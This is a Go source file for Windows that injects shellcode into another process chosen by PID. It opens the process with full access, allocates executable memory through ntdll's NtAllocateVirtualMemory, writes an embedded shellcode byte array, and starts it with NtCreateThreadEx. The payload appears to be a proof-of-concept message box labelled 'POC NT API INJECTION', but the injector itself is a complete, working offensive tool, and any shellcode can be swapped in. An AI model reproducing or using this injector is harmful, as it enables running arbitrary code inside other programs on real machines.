package main

import (
	"fmt"
	"os"
	"strconv"
	"syscall"
	"unsafe"
)



const PROCESS_ALL_ACCESS = 0x1F0FFF
const MEM_COMMIT = 0x1000 								//syscall.MEM_COMMIT
const MEM_RESERVE = 0x2000					 			//syscall.MEM_RESERVE
const PAGE_EXECUTE_READWRITE = 0x40						//syscall.PAGE_EXECUTE_READWRITE


//shell code
var codeS = []byte{0xfc,0x48,0x81,0xe4,0xf0,0xff,0xff,0xff,0xe8,
	0xd0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,
	0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x3e,0x48,0x8b,0x52,0x18,
	0x3e,0x48,0x8b,0x52,0x20,0x3e,0x48,0x8b,0x72,0x50,0x3e,0x48,
	0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,
	0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,
	0xe2,0xed,0x52,0x41,0x51,0x3e,0x48,0x8b,0x52,0x20,0x3e,0x8b,
	0x42,0x3c,0x48,0x01,0xd0,0x3e,0x8b,0x80,0x88,0x00,0x00,0x00,
	0x48,0x85,0xc0,0x74,0x6f,0x48,0x01,0xd0,0x50,0x3e,0x8b,0x48,
	0x18,0x3e,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x5c,0x48,
	0xff,0xc9,0x3e,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,
	0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,
	0x38,0xe0,0x75,0xf1,0x3e,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,
	0xd1,0x75,0xd6,0x58,0x3e,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
	0x66,0x3e,0x41,0x8b,0x0c,0x48,0x3e,0x44,0x8b,0x40,0x1c,0x49,
	0x01,0xd0,0x3e,0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,
	0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,
	0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x3e,
	0x48,0x8b,0x12,0xe9,0x49,0xff,0xff,0xff,0x5d,0x3e,0x48,0x8d,
	0x8d,0x34,0x01,0x00,0x00,0x41,0xba,0x4c,0x77,0x26,0x07,0xff,
	0xd5,0x49,0xc7,0xc1,0x40,0x00,0x00,0x00,0x3e,0x48,0x8d,0x95,
	0x0e,0x01,0x00,0x00,0x3e,0x4c,0x8d,0x85,0x23,0x01,0x00,0x00,
	0x48,0x31,0xc9,0x41,0xba,0x45,0x83,0x56,0x07,0xff,0xd5,0x48,
	0x31,0xc9,0x41,0xba,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x50,0x4f,
	0x43,0x20,0x4e,0x54,0x20,0x41,0x50,0x49,0x20,0x49,0x4e,0x4a,
	0x45,0x43,0x54,0x49,0x4f,0x4e,0x00,0x4e,0x54,0x20,0x41,0x50,
	0x49,0x20,0x49,0x4e,0x4a,0x45,0x43,0x54,0x49,0x4f,0x4e,0x00,
	0x75,0x73,0x65,0x72,0x33,0x32,0x2e,0x64,0x6c,0x6c,0x00};


func main() {
	if( len(os.Args) < 2){
		fmt.Printf("Usage: %s <PID>\n", os.Args[0])
		return 
	}
	PID := os.Args[1]
	fmt.Println("[?] PID: " + PID)
	

	var remoteB uintptr = 0
	var size uintptr = uintptr(len(codeS))

	
	//load DLL ntdll
	ntdll := syscall.NewLazyDLL("ntdll.dll")

	fmt.Println("[*] ntdll.dll Loaded")
	//function that we need ntdll
	NtAllocateVirtualMemory := ntdll.NewProc("NtAllocateVirtualMemory")
	NtWriteVirtualMemory := ntdll.NewProc("NtWriteVirtualMemory")
	NtCreateThreadEx := ntdll.NewProc("NtCreateThreadEx")

	hp := openProcess(PID)
	
	_, _, err := NtAllocateVirtualMemory.Call(uintptr(hp), uintptr(unsafe.Pointer(&remoteB)), 0, uintptr(unsafe.Pointer(&size)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	
	if err != nil && err.Error() != "The operation completed successfully." {
		fmt.Println("NtAllocateVirtualMemory error:", err)
	}
	
	
	NtWriteVirtualMemory.Call(uintptr(hp), remoteB, uintptr(unsafe.Pointer(&codeS[0])), uintptr(len(codeS)), 0)
	var hT  syscall.Handle 

	NtCreateThreadEx.Call(uintptr(unsafe.Pointer(&hT)), 0x1FFFFF, 0, uintptr(hp), remoteB, 0, 0, 0,0,0,0)

	fmt.Println("[!] Shell Code Injected")
	return 

}

func openProcess(pid string) syscall.Handle {
	//openprocess function
	kerner32 := syscall.NewLazyDLL("kernel32.dll")
	fmt.Println("[*] kerner32.dll Loaded")
	openProcess := kerner32.NewProc("OpenProcess")

	fmt.Println("[?] Try to open a process at: " + pid)
	pidC, _ := strconv.Atoi(pid)
	handle, _, _ := openProcess.Call(ptr(PROCESS_ALL_ACCESS), ptr(0), ptr(pidC))
	return syscall.Handle(handle)

}

// conversione in ptr
func ptr(val interface{}) uintptr {
	switch val.(type) {
	case string:
		return uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(val.(string))))
	case int:
		return uintptr(val.(int))

	default:
		return uintptr(0)
	}
}
